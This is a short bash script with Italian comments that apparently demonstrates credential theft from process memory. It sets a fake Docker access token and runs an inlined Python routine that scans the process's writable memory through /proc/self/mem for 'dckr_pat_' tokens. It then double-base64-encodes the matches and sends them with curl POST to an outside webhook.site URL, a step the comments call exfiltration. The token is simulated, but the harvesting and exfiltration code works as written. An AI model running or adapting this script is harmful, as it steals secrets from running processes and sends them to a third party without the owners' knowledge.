#!/bin/bash

echo "[*] Starting raw memory scan via /proc/self/mem"

# Simula token in memoria processuale (senza env)
SECRET="dckr_pat_FAKEBUTREALISTIC1234567890"
echo "$SECRET" > /dev/null

# Script Ayrx (inlined)
python3 - <<'EOF' > /tmp/dump.txt
import os, re
with open("/proc/self/maps") as maps, open("/proc/self/mem", "rb", 0) as mem:
    for line in maps:
        if "rw-p" not in line: continue
        m = re.match(r"([0-9A-Fa-f]+)-([0-9A-Fa-f]+)", line)
        if not m: continue
        start, end = [int(x, 16) for x in m.groups()]
        mem.seek(start)
        try:
            chunk = mem.read(end - start)
            for match in re.findall(rb'dckr_pat_[0-9A-Za-z_\-]{20,}', chunk):
                print(match.decode())
        except Exception:
            continue
EOF

# Esfiltra tutto ciò che è stato trovato
FOUND=$(cat /tmp/dump.txt | sort -u | base64 | base64)
curl -X POST --data "$FOUND" https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb

echo "[+] Done."
